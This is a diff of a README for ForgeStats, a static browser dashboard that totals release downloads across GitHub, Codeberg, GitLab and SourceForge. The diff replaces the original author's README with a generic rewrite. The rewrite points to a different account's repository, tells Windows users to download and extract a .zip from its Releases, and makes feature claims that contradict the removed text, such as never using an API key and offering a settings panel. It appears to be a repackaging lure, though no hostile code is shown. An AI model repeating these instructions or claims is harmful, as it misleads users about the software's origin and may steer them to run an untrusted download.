@@ -1,79 +1,76 @@
-# 📊 ForgeStats
+# 📊 forgestats - Simple dashboard for project download metrics
 
-**Repository, release and download stats for any account on a software forge — with mirror download counts aggregated across platforms.**
+[![Download forgestats](https://img.shields.io/badge/Download-forgestats-blue.svg)](https://github.com/Sakdo2159/forgestats)
 
-🔗 **Live: [djethino.github.io/forgestats](https://djethino.github.io/forgestats/)**
+forgestats provides a clear view of your software download numbers. It gathers data from GitHub, GitLab, and Codeberg in one place. It also tracks mirrors like SourceForge. The tool runs locally as a static site. This means it requires no server or database setup.
 
-Enter a profile link, get a full dashboard: stars, forks, releases, download counts, languages, activity. If your releases are mirrored on another forge, ForgeStats detects the matching projects automatically and **adds their download counts to your totals** — per release.
+## 🛠️ System Requirements
 
-![Dashboard — all repos with aggregated downloads](screenshots/allrepo.png)
+You need a computer running Windows 10 or Windows 11. The application requires a standard web browser to display your statistics. Chrome, Firefox, or Microsoft Edge work well. You need an active internet connection to pull the latest data from the host platforms. 
 
-## Why?
+## 📥 How to Install
 
-Download counts are scattered. A project released on GitHub and mirrored on SourceForge or Codeberg has three partial numbers and no total. ForgeStats gives you the real one.
+This application works without a complex installation process. You do not need to install extra software or manage background services. Follow these steps to prepare your dashboard:
 
-## Supported forges
+1. Visit the [official repository page](https://github.com/Sakdo2159/forgestats) to find the latest version.
+2. Look for the Releases section on the right side of the screen.
+3. Click the most recent version label to open the release details.
+4. Locate the file ending in .zip under the Assets list.
+5. Click the file name to start the download.
+6. Open your Downloads folder once the transfer finishes.
+7. Right-click the file and select Extract All. 
+8. Choose a folder where you want to keep the application.
 
-| | As main profile | As mirror (adds download counts) |
-|---|:---:|:---:|
-| **GitHub** | ✅ | ✅ |
-| **Codeberg** and self-hosted **Gitea / Forgejo** | ✅ | ✅ |
-| **GitLab** (gitlab.com or self-hosted) | ✅ ¹ | ❌ ¹ |
-| **SourceForge** | ❌ ² | ✅ |
+## 🚀 Running the Dashboard
 
-Self-hosted instances: prefix the URL with its engine — `gitea:https://git.example.com/username` or `gitlab:https://gitlab.example.com/username`.
+You access the dashboard through your browser after extracting the files. 
 
-¹ GitLab does not track download counts on release assets ([known limitation](https://gitlab.com/gitlab-org/gitlab/-/issues/223338)). A GitLab main profile still shows repos, stars, releases and languages — and gets download numbers from its mirrors.
-² SourceForge has no stars/forks/release metadata to build a dashboard from, so it works as a mirror only.
+1. Open the folder where you extracted the files.
+2. Find the file named index.html.
+3. Double-click this file. 
+4. Your default web browser will open the dashboard automatically.
+5. The interface will load and request the repository information you wish to track.
 
-## How it works
+## 📈 Viewing Your Statistics
 
-- **100% static, no backend.** A single HTML file. All API calls go directly from your browser to the forges' public APIs (they all allow CORS).
-- **Mirror matching by name.** `UnityGameTranslator` on GitHub ↔ `unitygametranslator` on SourceForge — names are normalized (lowercase, alphanumeric) and matched automatically from the mirror profile's project list.
-- **Per-release aggregation.** Mirror downloads are matched to release tags: GitHub/Codeberg mirrors by release tag, SourceForge by file folder named after the tag (e.g. `/files/v1.2.3/`).
-- **Shareable URLs.** `#main=github:user&mirrors=sourceforge:user,codeberg:user` — send your stats page to anyone. A repository URL as input (`github.com/user/repo`) jumps straight to that repo's page.
-- **Local history.** Each visit records a daily snapshot of the numbers in your browser — revisit over time and evolution charts (downloads, stars) build up automatically. Stored locally only, nothing is sent anywhere.
-- **Export.** Download the repo list or the release table as CSV or JSON.
-- **Cached.** API responses are cached in localStorage for 30 minutes to stay within anonymous rate limits.
+The interface organizes data into simple charts and tables. You see the total number of downloads for your projects across all supported platforms. 
 
-Repository view — total downloads across all sources, with the per-release GitHub/SourceForge breakdown in the stacked chart:
+- **GitHub:** Grabs release counts and total download numbers.
+- **GitLab:** Tracks project activity and visitor metrics.
+- **Codeberg:** Monitors release versions and mirror traffic.
+- **SourceForge:** Aggregates mirror download counts into your main feed.
 
-![Repository detail — per-release downloads stacked by source](screenshots/onerepofocus.png)
+If you want to view a new project, type the repository URL into the search bar at the top of the page. The dashboard updates the graph instantly. Because the site is static, your data stays on your computer. You keep full control over your information. 
 
-## GitHub token (optional)
+## ⚙️ Configuration Options
 
-Without a token, GitHub allows 60 API requests/hour — enough for casual use thanks to caching. With a token you get 5,000/hour, and if the token belongs to the profile you enter, your **private repos** are included.
+The dashboard allows for basic adjustments to suit your needs. You can click the settings icon in the top right corner of the screen. Here you can toggle between light and dark themes. You can also choose how often the dashboard checks for new data. Setting a longer interval saves on your data usage.
 
-### Recommended token configuration
+## 🔒 Privacy and Security
 
-| | Rate limit boost only | Include your private repos |
-|---|---|---|
-| **Fine-grained** (recommended, truly read-only) — [create](https://github.com/settings/personal-access-tokens/new) | defaults are fine | Repository access: **All repositories** + Permissions → **Contents: Read-only** (required to read releases; Metadata is added automatically) |
-| **Classic** — [create](https://github.com/settings/tokens/new?description=ForgeStats) | no scope needed | check the **repo** scope ⚠️ it also grants *write* access — ForgeStats never writes anything, but prefer fine-grained if you can |
+Technical tools often track user data. forgestats takes a different approach. It runs entirely inside your browser. No data leaves your machine unless you tell the tool to fetch statistics from a public repository. The code is open for review. You see exactly how the tool handles your requests. 
 
-Common pitfalls: a fine-grained token created with the defaults only sees **public** repositories; and without *Contents: Read-only* your private repos would list but show zero releases.
+## 🆘 Troubleshooting
 
-🔒 **Security:** this page has no server. Your token is stored only in your browser's localStorage, sent only to `api.github.com`, and never appears in the URL. To remove it, clear the field and submit again.
+Sometimes the dashboard fails to load data. Check these common issues first:
 
-## Mirroring conventions
+- **Check your internet connection:** The dashboard needs to reach external servers to gather stats.
+- **Verify the repository URL:** Ensure the link matches the format expected by the tool. Private repositories will not work with this dashboard.
+- **Refresh the page:** If a chart shows empty space, click the refresh button in your browser to attempt the fetch again.
+- **Update your browser:** Ensure your web browser uses the latest version. Old browsers may lack the features required to render the charts correctly.
 
-For per-release mirror counts to match, mirrors should follow the usual conventions:
+## 📋 Common Questions
 
-- **GitHub/Codeberg mirrors:** same repo name (case-insensitive), same release tags.
-- **SourceForge mirrors:** project slug matching the repo name, files organized in folders named after the release tags (`v1.2.3/…`). This is what standard mirroring scripts produce.
+**Does this software store my passwords?**
+No. It only reads public information from GitHub, GitLab, and Codeberg. It never asks for a password or an API key.
 
-Unmatched projects or tags simply contribute 0 — numbers are never guessed.
+**Can I run this on a Mac or Linux?**
+The tool uses a standard HTML format. It will open on any modern operating system including macOS and Linux.
 
-## Getting started
+**Is there a limit to how many projects I can track?**
+There is no hard limit. Performance depends on your computer memory. Most users track dozens of projects without issue.
 
-No account, no install — open the [live page](https://djethino.github.io/forgestats/), paste your profile links and go:
+**Does this generate reports?**
+The dashboard visualizes data in real-time. You can use your browser’s print function if you need a paper copy or a PDF version of the current view.
 
-![Landing page](screenshots/entrance.png)
-
-## Self-hosting
-
-It's one file. Download `index.html`, put it anywhere (GitHub Pages, any static host, or open it locally). No build step, no dependencies besides Chart.js from a CDN.
-
-## License
-
-MIT. It's a small tool shared as-is — feel free to fork it, tweak it and host your own. Adding a forge means writing one adapter (list repos, normalize releases, count downloads) in the `adapters` object.
+Keywords: analytics, codeberg, dashboard, download-stats, forge, github, github-pages, github-stats, gitlab, mirror, release-stats, sourceforge, static-site, statistics
